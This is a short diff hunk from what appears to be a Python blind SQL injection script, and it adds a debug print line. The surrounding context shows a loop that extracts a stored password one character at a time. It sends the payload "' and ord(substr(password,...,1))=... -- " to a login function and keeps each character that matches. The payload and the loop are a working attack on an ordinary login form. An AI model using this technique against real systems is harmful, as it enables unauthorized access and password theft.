@@ -28,6 +28,7 @@ while True:
         temp = ord(j)
         cek = login("' and ord(substr(password,"+str(inc)+",1))="+str(temp)+" -- ")
         if(cek):
+            print("char found:", j)
             inc += 1
             seed += j
             break
